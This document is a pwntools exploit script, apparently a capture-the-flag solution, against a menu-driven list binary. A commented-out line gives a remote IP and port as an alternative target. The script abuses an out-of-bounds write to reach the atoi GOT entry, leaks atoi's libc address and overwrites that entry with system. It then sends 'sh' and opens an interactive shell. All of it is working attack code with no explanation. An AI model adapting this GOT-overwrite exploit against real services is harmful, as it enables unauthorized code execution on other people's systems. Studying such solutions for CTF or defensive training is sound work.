from pwn import *
context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]
io = process('./main')
# p = remote('47.106.172.144',65001)


l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, b'\x00'))
uu64 = lambda data		: u64(data.ljust(8, b'\x00'))
ur64 = lambda data		: u64(data.rjust(8, b'\x00'))

def New(count):
    sla("> ",str(1))
    sla(": ",str(count))
def Show(count,item):
    sla("> ",str(2))
    sla("id: ",str(count))
    sla("id: ",str(item))
def Edit(count,item,num):
    sla("> ",str(3))
    sla("List id: ",str(count))
    sla("Item id: ",str(item))
    sla("number: ",str(num))
def Over_write(count,end,num,flags = 1):
    sla("> ",str(4))
    sla("id: ",str(count))
    if flags:
        sla("id: ",str(end))
        sla("id: ",str(end))
    sla("number: ",str(num))
def show_all():
    sla("> ",str(5))
New(0x1)#0
New(0x4)#1

Over_write(0,4,0x405070) # atoi
# dbg()
Show(1,0)
libc = ELF("./libc.so.6")
ru("Number: ")
atoi = int(ru("\n",True),10)
print(hex(libc.symbols['system']))
system = atoi - libc.symbols["atoi"]+libc.symbols["system"]

Edit(1,0,system)

sla("> ",'sh\x00')

irt()